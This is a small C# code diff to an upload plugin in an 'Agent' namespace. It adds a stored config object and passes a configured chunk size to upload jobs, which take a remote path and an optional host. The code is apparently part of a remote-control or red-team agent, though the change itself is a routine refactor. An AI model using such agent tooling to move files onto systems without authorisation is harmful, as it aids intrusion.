@@ -13,6 +13,7 @@ namespace Agent
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
         private ITokenManager tokenManager { get; set; }
+        private IAgentConfig config { get; set; }
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
@@ -20,11 +21,12 @@ namespace Agent
             this.logger = logger;
             this.tokenManager = tokenManager;
             this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
+            this.config = config;
         }
 
         public async Task Execute(ServerJob job)
         {
-            ServerUploadJob uploadJob = new ServerUploadJob(job);
+            ServerUploadJob uploadJob = new ServerUploadJob(job, this.config.chunk_size);
             Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
             uploadJob.path = uploadParams["remote_path"];
             if (uploadParams.ContainsKey("host") && !string.IsNullOrEmpty(uploadParams["host"]))
